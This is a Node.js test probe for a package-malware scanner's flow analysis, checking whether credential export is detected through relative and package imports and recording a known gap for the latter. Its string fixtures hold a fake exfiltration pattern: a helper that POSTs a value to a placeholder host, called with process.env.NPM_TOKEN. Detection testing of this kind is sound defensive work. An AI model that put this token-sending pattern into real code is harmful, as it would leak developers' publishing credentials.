// Only the explicitly supplied, trusted pkgxray scanner is loaded. Fixture
// programs below are parsed as strings; they are never executed or installed.
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { resolve } from 'node:path';

const scannerRoot = process.argv[2];
if (!scannerRoot || process.argv.length !== 3) {
  console.error('Usage: npm run probe -- /path/to/trusted/pkgxray-checkout');
  process.exit(2);
}
const require = createRequire(import.meta.url);
const { createFlowAnalysis } = require(resolve(scannerRoot, 'src/flow-analysis.js'));

function inspect(specifier, helperPath, argument) {
  const files = [
    {
      path: 'index.js',
      content: `const send = require(${JSON.stringify(specifier)}); send(${argument});`,
    },
    {
      path: helperPath,
      content: 'module.exports = function send(value) { fetch("https://example.invalid/collect", {method:"POST", body:value}); };',
    },
  ];
  const engine = createFlowAnalysis(files);
  return files.map(({ path }) => {
    const result = engine.analyze(path);
    return { file: path, status: result.status, hints: result.hints, gaps: result.gaps ?? [] };
  });
}

const cases = {
  relativeSecret: inspect('./sender.js', 'sender.js', 'process.env.NPM_TOKEN'),
  packageSecret: inspect('sender', 'node_modules/sender/index.js', 'process.env.NPM_TOKEN'),
  relativeBenign: inspect('./sender.js', 'sender.js', '"public diagnostic message"'),
  packageBenign: inspect('sender', 'node_modules/sender/index.js', '"public diagnostic message"'),
};
const detectsExport = results => results.some(result => result.hints.some(hint => hint.kind === 'credential-export'));
assert.ok(detectsExport(cases.relativeSecret), 'Relative-import positive control must detect credential flow.');
assert.ok(!detectsExport(cases.relativeBenign), 'Relative-import benign control must remain clear.');
assert.ok(!detectsExport(cases.packageBenign), 'Package-import benign control must remain clear.');
const boundary = cases.packageSecret;
const gapReproduced = !detectsExport(boundary) && boundary.every(result => result.status === 'parsed' && result.gaps.length === 0);
console.log(JSON.stringify({
  gapReproduced,
  scope: 'Flow-engine probe only; this is not a full pkgxray verdict or a malware determination.',
  cases,
}, null, 2));
if (!gapReproduced) {
  console.error('The historical boundary gap no longer reproduces; review the scanner results before relying on this baseline.');
  process.exitCode = 1;
}
